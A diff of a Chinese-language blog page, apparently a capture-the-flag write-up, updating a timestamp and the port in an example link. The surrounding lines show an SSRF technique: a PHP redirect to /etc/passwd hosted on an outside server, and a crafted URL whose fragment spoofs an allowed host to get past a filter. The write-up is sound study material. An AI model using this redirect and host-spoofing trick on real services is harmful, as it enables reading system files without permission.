@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629628486321301/4bbfff035ec86ff8a82132b364f7dc501e6bc0be.png">
 <meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629648489140912/b6a016a4462bef6cf12dd4d16630d1fbbb3ed4f6.png">
 <meta property="article:published_time" content="2021-08-23T05:08:00.000Z">
-<meta property="article:modified_time" content="2021-08-23T05:12:24.738Z">
+<meta property="article:modified_time" content="2021-08-23T05:36:06.723Z">
 <meta property="article:author" content="LemonPrefect">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559257568922/0e21f3fd71546968853cd4fb06e95498acfa99bf.png">
@@ -265,7 +265,7 @@
 <p>此处限定了链接所使用的协议，但是并没有限制跳转，因此可以借助服务器进行 302 跳转。在服务器中写如下代码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;Location: file///etc/passwd&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>同时恶意链接写作 <code>http://8.136.8.210:3255#oss-cn-beijing.ichunqiu.com</code> 即可成功绕过此处的处理，进而 SSRF。结合题目描述和使用 file 协议读到的 /readflag 文件可知需要执行 /readflag 来获取 flag。</p>
+<p>同时恶意链接写作 <code>http://8.136.8.210:10025#oss-cn-beijing.ichunqiu.com</code> 即可成功绕过此处的处理，进而 SSRF。结合题目描述和使用 file 协议读到的 /readflag 文件可知需要执行 /readflag 来获取 flag。</p>
 <h4 id="Zombie-Package-Code-Injection"><a href="#Zombie-Package-Code-Injection" class="headerlink" title="Zombie Package Code Injection"></a>Zombie Package Code Injection</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p>
 </blockquote>
